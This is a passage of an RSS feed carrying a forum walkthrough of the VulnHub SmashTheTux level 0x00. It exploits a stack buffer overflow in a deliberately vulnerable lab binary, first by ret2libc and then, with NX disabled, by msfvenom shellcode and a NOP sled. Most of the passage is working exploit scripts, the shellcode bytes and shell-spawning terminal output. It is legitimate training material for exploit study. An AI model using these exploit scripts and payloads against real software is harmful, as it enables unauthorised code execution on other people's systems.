+<pre><code class="lang-auto">268 + 0xb7e643e0 + 0xb7e571b0 + 0xb7f85a69
+</code></pre>
+<p>We can use python for doing exploitation</p>
+<pre data-code-wrap="bash"><code class="lang-bash"># cat bypass_nx.py
+from struct import *
+
+buf = ""
+buf += "X" * (268)
+buf += pack("&lt;L",0xb7e643e0) #system() address
+buf += pack("&lt;L",0xb7e571b0) #exit() address
+buf += pack("&lt;L",0xb7f85a69 ) #/bin/sh call address
+print buf
+</code></pre>
+<p>Time to exploit</p>
+<pre><code class="lang-auto">tux@tux:~/0x00$ ./pwnme $(python bypass_nx.py)
+Val: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�C淰q��iZ��
+$ ps
+  PID TTY          TIME CMD
+  816 pts/0    00:00:00 bash
+ 1092 pts/0    00:00:00 pwnme
+ 1094 pts/0    00:00:00 sh
+ 1098 pts/0    00:00:00 ps
+$ echo $0
+/bin/sh
+</code></pre>
+<p>Horrraaaayyyyyyyyy! We can spawn new shell. <img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"></p>
+<blockquote>
+<p>In the end, We will return to libc</p>
+</blockquote>
+<p><strong>[BONUS] Exploiting with NX Disable</strong></p>
+<p>By default, the program compiled with NX protection and not allowed for executes the payload in stack address. For this bonus section, we can recompile using <code>execstack</code> parameter for gcc.</p>
+<pre><code class="lang-auto">mv pwnme pwnme-nx
+gcc pwnme.c -o pwnme -fno-stack-protector -z execstack
+</code></pre>
+<p>Check with gdb-peda.</p>
+<pre><code class="lang-auto">tux@tux:~/0x00$ gdb pwnme 
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i586-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from pwnme...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+<p>As you can see, NX protection is disabled for now. We need to know where we will jump by checking the <code>jmp call eax</code> address.</p>
+<p>Searching for jmp/eax call, this information will be useful when overwritting EIP Address.</p>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ jmpcall
+0x8048393 : call eax
+0x80483cd : call edx
+0x8048420 : call edx
+0x80485b7 : jmp [eax]
+0x8049393 : call eax
+0x80493cd : call edx
+0x8049420 : call edx
+0x80495b7 : jmp [eax]
+</code></pre>
+<p>We will use <code>0x8048393 : call eax</code> and note this address as return address.</p>
+<p>Now, this is what we got so far:</p>
+<ul>
+<li>EIP Offset 0x41332541</li>
+<li>Offset Number 268</li>
+<li>return address 0x8048393</li>
+<li>padding/nop =&gt; 268 - shellcode buf - 4</li>
+</ul>
+<p>We know that our offset is 268 and here is the formula I used:</p>
+<blockquote>
+<p>Padding + shellcode buf + return address</p>
+</blockquote>
+<p><strong>Generating Payload</strong></p>
+<p>For this purpose, we need Venom for creating the payload because Spiderman is far from home :P. I think 268 bytes is enough for basic <code>exec</code> linux payload. You may use other shellcode than venom. I’m just prefer this for easy to use. I’m exclude “\x00\x0a\0d” from shellcode payload as bad character.</p>
+<pre data-code-wrap="bash"><code class="lang-bash">↳ msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux  -f python -b "\x00\x0a\0d"
+WARNING: Nokogiri was built against LibXML version 2.9.8, but has dynamically loaded 2.9.9
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 72 (iteration=0)
+x86/shikata_ga_nai chosen with final size 72
+Payload size: 72 bytes
+Final size of python file: 358 bytes
+buf =  ""
+buf += "\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
+buf += "\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93"
+buf += "\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45"
+buf += "\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2"
+buf += "\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66"
+buf += "\x6e\x4a\x76\xff\x8f\xb9\xf8"
+</code></pre>
+<p>Okay, time for generating our final payload:</p>
+<pre data-code-wrap="python"><code class="lang-python">import os
+
+# linux/x86/exec CMD=/bin/bash payload 
+# bad char : "\x00\x0a\0d"
+
+buf =  ""
+buf += "\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
+buf += "\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93"
+buf += "\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45"
+buf += "\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2"
+buf += "\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66"
+buf += "\x6e\x4a\x76\xff\x8f\xb9\xf8"
+
+# define offset
+offset = 268
+
+# (268 - 72) - 4 = 192
+padding = (offset - len(buf)) - 4
+
+# NOPSLED as identifer with total offset - size of the buf
+payload =  "\x90" * padding + buf
+
+# overwrite EIP to jump to 'call eax' in little endians
+payload += "\x93\x83\x04\08"
+
+print payload
+</code></pre>
+<p>With that script, you don’t need to worry thinking of how many padding you should use.</p>
+<p>Time to exploit:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ echo $$
+1335
+tux@tux:~/0x00$ ps
+  PID TTY          TIME CMD
+ 1335 pts/0    00:00:00 bash
+ 1437 pts/0    00:00:00 ps
+tux@tux:~/0x00$ ./pwnme $(python exploit.py)
+Val: �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������rqp4���t$�Z)ɱ
+                                      ���1BB}��^�
+                                                 ����Ғ{�E�������%����RC��;-�i��fnJv������8
+tux@tux:/home/tux/0x00$ echo $$
+1440
+tux@tux:/home/tux/0x00$ ps
+  PID TTY          TIME CMD
+ 1335 pts/0    00:00:00 bash
+ 1439 pts/0    00:00:00 sh
+ 1440 pts/0    00:00:00 bash
+ 1445 pts/0    00:00:00 ps
+tux@tux:/home/tux/0x00$ 
+</code></pre>
+<p>Horraaayyy! <img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"></p>
+<p>I will discuss Level 0x01 in the next series of SmashTheTux. Feedback are welcome &lt;3. See ya!</p>
+<p>Reference:</p>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/120.html" class="inline-onebox" rel="noopener nofollow ugc">CWE - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') (4.18)</a></li>
+<li><a href="https://www.freebsd.org/cgi/man.cgi?query=strlcpy&amp;sektion=3" class="inline-onebox" rel="noopener nofollow ugc">strlcpy(3)</a></li>
+<li><a href="https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md" class="inline-onebox" rel="noopener nofollow ugc">peda_cheatsheet/peda.md at master · ebtaleb/peda_cheatsheet · GitHub</a></li>
+<li><a href="https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html" rel="noopener nofollow ugc">https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html</a></li>
+<li><a href="https://www.shellblade.net/docs/ret2libc.pdf" rel="noopener nofollow ugc">https://www.shellblade.net/docs/ret2libc.pdf</a></li>
+<li><a href="https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/" class="inline-onebox" rel="noopener nofollow ugc">Simple ASLR/NX bypass on a Linux 32 bit binary – Decoder's Blog</a></li>
+<li><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" class="inline-onebox" rel="noopener nofollow ugc">Bypassing NX bit using return-to-libc – sploitF-U-N</a></li>
+<li><a href="https://reboare.github.io/bof/linux-stack-bof-3.html" class="inline-onebox" rel="noopener nofollow ugc">Stack Buffer Overflows: Linux 3 - Bypassing DEP with ROP | Booj</a></li>
+<li><a href="https://www.coengoedegebure.com/buffer-overflow-attacks-explained/" class="inline-onebox" rel="noopener nofollow ugc">Buffer overflow attacks explained</a></li>
+</ul>
+          <p><a href="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/1</link>
+        <pubDate>Tue, 09 Jul 2019 09:57:46 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-14850-1</guid>
+        <source url="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</source>
+      </item>
+  </channel>
+</rss>
